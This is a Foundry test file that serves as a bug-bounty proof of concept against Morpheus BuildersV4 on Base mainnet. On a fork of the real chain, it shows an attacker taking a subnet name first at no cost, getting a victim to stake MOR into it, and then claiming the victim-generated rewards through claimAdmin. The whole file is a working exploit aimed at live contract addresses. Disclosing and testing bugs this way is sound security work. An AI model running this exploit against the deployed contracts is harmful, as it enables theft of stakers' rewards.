pragma solidity ^0.8.24;

import {Test, console2} from "forge-std/Test.sol";

/**
 * PoC for finding P2-1 (Morpheus Bug Bounty v2, program contact via mor.org):
 * BuildersV4.createSubnet is UNPERMISSIONED and FREE (subnetCreationFeeAmount == 0,
 * no admin/msg.sender gate) → an attacker front-runs a subnet name a victim intends
 * to use; once the victim stakes MOR into the attacker-named subnet, the attacker's
 * claimAdmin captures 100% of the Builder emission generated by the victim's deposit.
 *
 * Deployed contracts (Base mainnet, bug-bounty Appendix A):
 *   BuildersV4         0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9  (ERC1967 proxy)
 *   BuildersTreasuryV2 0x9eba628581896ce086cb8f1A513ea6097A8FC561  (ERC1967 proxy)
 *   RewardPool         0xDC99a8596e395E52aba2BD08C623E1e428Dc3980  (ERC1967 proxy)
 *   FeeConfig          0x845FBB4B3e2207BF03087b8B94D2430AB11088eE  (ERC1967 proxy)
 *   MOR (MOROFT)       0x7431aDa8a591C955a994a21710752EF9b882b8e3
 *
 * Mechanisms exercised (all on the REAL deployed bytecode via a Base fork):
 *   - BuildersV4.createSubnet(Subnet,SubnetMetadata)   BuildersV4.sol:194-217 — no
 *     caller gate in _validateSubnet (:243-251); fee branch (:203-211) skipped
 *     because subnetCreationFeeAmount() == 0.
 *   - BuildersV4.deposit(bytes32,uint256)              :280-297 — the normal user
 *     staking flow (approve + deposit).
 *   - BuildersV4._updatePoolData/_getCurrentRate       :361-413 — each subnet's
 *     reward share is weighted by subnetsData[id].deposited; the attacker subnet's
 *     deposited comes 100% from the victim.
 *   - BuildersV4.claim(bytes32,address)                :326-352 — subnet admin OR
 *     claimAdmin receives ALL pendingRewards (FEE_CLAIM_OPERATION fee == 0 on the
 *     live FeeConfig → treasury cut is zero).
 *
 * No privileged pranks are used: the attacker is a bare address with ZERO MOR; the
 * only `deal` is user-side (the victim's MOR stake).
 */
interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

interface IBuildersV4 {
    struct Subnet {
        string name;
        address admin;
        uint128 unusedStorage1_V4Update;
        uint128 withdrawLockPeriodAfterDeposit;
        uint128 unusedStorage2_V4Update;
        uint256 minimalDeposit;
        address claimAdmin;
    }

    struct SubnetMetadata {
        string slug;
        string description;
        string website;
        string image;
    }

    function depositToken() external view returns (address);
    function subnetCreationFeeAmount() external view returns (uint256);
    function minimalWithdrawLockPeriod() external view returns (uint256);
    function networkShare() external view returns (uint256);
    function rewardPool() external view returns (address);
    function allSubnetsData() external view returns (uint256, uint256, uint256, uint256);
    function getSubnetId(string memory) external view returns (bytes32);
    function createSubnet(Subnet calldata, SubnetMetadata calldata) external;
    function deposit(bytes32, uint256) external;
    function withdraw(bytes32, uint256) external;
    function claim(bytes32, address) external;
    function getCurrentSubnetRewards(bytes32) external view returns (uint256);
    function subnetsData(bytes32)
        external
        view
        returns (uint128, uint256, uint256, uint256, uint256);
    function usersData(address, bytes32) external view returns (uint128, uint128, uint256, uint256);
}

interface IRewardPool {
    function getPeriodRewards(uint256, uint128, uint128) external view returns (uint256);
}

interface IFeeConfig {
    function getFeeAndTreasuryForOperation(address, bytes32) external view returns (uint256, address);
}

contract BuildersSubnetFrontrun is Test {
    // ------------- deployed protocol (Base mainnet) -------------
    address constant BUILDERS = 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9;
    address constant MOR = 0x7431aDa8a591C955a994a21710752EF9b882b8e3;
    address constant REWARD_POOL = 0xDC99a8596e395E52aba2BD08C623E1e428Dc3980;
    address constant FEE_CONFIG = 0x845FBB4B3e2207BF03087b8B94D2430AB11088eE;

    // RewardPool bucket 3 = the Builders bucket (read on-chain):
    //   payoutStart 1707393600, decreaseInterval 86400 (1 day),
    //   initialReward 3456e18, rewardDecrease 592558728240000000
    uint256 constant BUILDER_BUCKET = 3;
    uint256 constant PRECISION = 1e25; // @solarity PRECISION, networkShare 100% == 1e25

    // pinned fork block (Base), timestamp 1793626029 (2026-11-02)
    uint256 constant PINNED_BLOCK = 53_418_336;

    address attacker; // front-runs the subnet name; becomes subnet admin. Holds ZERO MOR.
    address attackerClaimer; // attacker's claimAdmin address
    address victim; // honest staker who intended to use the name

    function setUp() public {
        vm.createSelectFork(vm.envString("BASE_RPC_URL"), PINNED_BLOCK);

        attacker = makeAddr("attacker");
        attackerClaimer = makeAddr("attackerClaimer");
        victim = makeAddr("victim");
    }

    function test_SubnetFrontrun_CapturesVictimEmission() public {
        IBuildersV4 builders = IBuildersV4(BUILDERS);
        IERC20 mor = IERC20(MOR);

        // ====================================================================
        // 0. On-chain preconditions of the finding (verified live, not mocked)
        // ====================================================================
        assertEq(builders.depositToken(), MOR, "deposit token is MOR");
        assertEq(builders.subnetCreationFeeAmount(), 0, "subnet creation must be free (P2-1 premise)");
        uint256 minLock = builders.minimalWithdrawLockPeriod();
        uint256 networkShare = builders.networkShare(); // live: 8e24 = 80%
        (, uint256 rateBefore, uint256 totalDepositedBefore,) = builders.allSubnetsData(); // (unused, rate, totalDeposited, unused)
        (, uint256 undistributed, uint256 claimed,) = _allSubnetsDataV4();

        console2.log("subnetCreationFeeAmount :", builders.subnetCreationFeeAmount());
        console2.log("networkShare (80% = 8e24):", networkShare);
        console2.log("global totalDeposited   :", totalDepositedBefore);
        console2.log("global rate             :", rateBefore);
        console2.log("undistributed/claimed   :", undistributed, claimed);

        // ====================================================================
        // 1. ATTACK: attacker front-runs the subnet name the victim will use.
        //    Bare address, zero MOR, no approvals — creation is free & ungated.
        // ====================================================================
        string memory targetName = "PrettyLegitSubnet"; // name a real project announced
        vm.prank(attacker);
        builders.createSubnet(
            IBuildersV4.Subnet({
                name: targetName,
                admin: attacker, // attacker becomes subnet admin
                unusedStorage1_V4Update: 0,
                withdrawLockPeriodAfterDeposit: uint128(minLock), // must be >= minimal (604800)
                unusedStorage2_V4Update: 0,
                minimalDeposit: 1e18,
                claimAdmin: attackerClaimer // attacker's claim path
            }),
            IBuildersV4.SubnetMetadata({
                slug: "pretty-legit-subnet",
                description: "Official PrettyLegit Subnet (impersonated)",
                website: "https://prettylegit.example",
                image: "https://prettylegit.example/logo.png"
            })
        );
        // creation was FREE: attacker still holds zero MOR (and never approved anything)
        assertEq(mor.balanceOf(attacker), 0, "subnet creation cost the attacker nothing");

        bytes32 subnetId = builders.getSubnetId(targetName);

        // ====================================================================
        // 2. VICTIM: normal staking flow (approve + deposit) into the subnet
        //    that carries the name they intended to use.
        // ====================================================================
        uint256 stake = 10_000e18;
        deal(MOR, victim, stake); // user-side setup only

        vm.startPrank(victim);
        mor.approve(BUILDERS, stake);
        builders.deposit(subnetId, stake); // BuildersV4.sol:280-297
        vm.stopPrank();

        assertEq(mor.balanceOf(victim), 0, "victim's full stake is in BuildersV4");
        (, uint256 subnetDeposited,,,) = builders.subnetsData(subnetId);
        assertEq(subnetDeposited, stake, "attacker subnet's deposit is 100% victim money");

        // NOTE: capture the deposit timestamp from CONTRACT STORAGE, not from
        // `block.timestamp` — with via_ir/optimizer, Solidity may rematerialize
        // `block.timestamp` reads across `vm.warp` (it is "movable" in the Yul
        // optimizer), silently substituting the post-warp value. A storage read
        // through a real staticcall is stable. `_updatePoolData` sets
        // `allSubnetsDataV4.lastUpdate = block.timestamp` on every deposit
        // (BuildersV4.sol:376), so this is exactly the timestamp the victim's
        // deposit was booked at — and exactly the `from_` the later claim uses.
        uint256 tsDeposit;
        {
            (,,, uint128 lastUpdateAfterDeposit) = _allSubnetsDataV4();
            tsDeposit = uint256(lastUpdateAfterDeposit);
        }
        (, uint256 rateAtDeposit, uint256 totalDepositedAfter,) = builders.allSubnetsData();
        console2.log("totalDeposited after victim deposit:", totalDepositedAfter);

        // ====================================================================
        // 3. Let one emission interval pass (RewardPool bucket-3 curve:
        //    decreaseInterval = 86400 = 1 day — same timing the Linear-
        //    DistributionIntervalDecrease curve uses for each reward step).
        // ====================================================================
        vm.warp(tsDeposit + 86_400);

        // Emission attributable to the victim's deposit over this window:
        //   subnetPending = (rateNow - rateAtDeposit) * subnetDeposited / 1e25
        //   rateNow - rateAtDeposit = rewardForSubnets(window) / totalDepositedAfter
        //   rewardForSubnets(window) = getPeriodRewards(3, tsDeposit, now) * networkShare / 1e25
        uint256 raw = IRewardPool(REWARD_POOL).getPeriodRewards(
            BUILDER_BUCKET, uint128(tsDeposit), uint128(block.timestamp)
        );
        uint256 rewardForSubnets = raw * networkShare / PRECISION;
        uint256 expectedVictimEmission = rewardForSubnets * stake / totalDepositedAfter;

        uint256 pending = builders.getCurrentSubnetRewards(subnetId); // pre-claim view
        console2.log("bucket-3 raw emission over 1d      :", raw);
        console2.log("rewardForSubnets (x networkShare) :", rewardForSubnets);
        console2.log("expected emission from VICTIM stake:", expectedVictimEmission);
        console2.log("subnet pendingRewards (view)      :", pending);

        // ====================================================================
        // 4. ATTACKER CLAIMS (claimAdmin path, BuildersV4.sol:326-352) and
        //    captures the entire emission generated by the victim's deposit.
        // ====================================================================
        // live FeeConfig charges 0 for FEE_CLAIM_OPERATION on BuildersV4
        (uint256 claimFee,) = IFeeConfig(FEE_CONFIG).getFeeAndTreasuryForOperation(
            BUILDERS, bytes32("claim")
        );
        assertEq(claimFee, 0, "claim fee is zero on live FeeConfig");

        uint256 claimerBefore = mor.balanceOf(attackerClaimer);
        vm.prank(attackerClaimer); // unprivileged attacker address, no stake, no role
        builders.claim(subnetId, attackerClaimer);
        uint256 stolen = mor.balanceOf(attackerClaimer) - claimerBefore;

        console2.log("MOR received by ATTACKER claimAdmin:", stolen);

        // ====================================================================
        // 5. ASSERTIONS — attacker captured the victim-generated emission
        // ====================================================================
        assertGt(stolen, 0, "attacker received MOR emission");
        assertGt(stolen, 1e18, "captured emission is material (> 1 MOR)");
        // attacker's subnet contains ONLY the victim's deposit → its entire
        // pendingRewards IS the victim-generated emission
        assertApproxEqAbs(stolen, pending, 1e15, "claim paid the full subnet pendingRewards");
        assertApproxEqRel(
            stolen, expectedVictimEmission, 1e14, "stolen == victim-generated emission (0.01% tol)"
        );

        // the victim, whose capital produced this emission, received NOTHING:
        // UserData (IBuildersV4.sol:112-117) has no reward field and no user claim path
        assertEq(mor.balanceOf(victim), 0, "victim received zero emission");
        // victim principal is locked (7d minimalWithdrawLockPeriod) but not stolen
        (uint128 lastDeposit,, uint256 victimDeposited,) = builders.usersData(victim, subnetId);
        assertEq(victimDeposited, stake, "victim principal still staked");
        assertEq(uint256(lastDeposit), tsDeposit, "withdraw lock started at deposit");

        // summary
        console2.log("=== P2-1 confirmed: free unpermissioned createSubnet ==");
        console2.log("=== front-run -> victim stake -> attacker claims emission ===");
        console2.log("attacker total cost for the whole attack (MOR):", uint256(0));
    }

    /// live accessor for AllSubnetsDataV4(distributedRewards, undistributed, claimed, lastUpdate)
    function _allSubnetsDataV4() internal view returns (uint256, uint256, uint256, uint128) {
        (bool ok, bytes memory data) = BUILDERS.staticcall(
            abi.encodeWithSignature("allSubnetsDataV4()")
        );
        require(ok, "allSubnetsDataV4 call failed");
        return abi.decode(data, (uint256, uint256, uint256, uint128));
    }
}
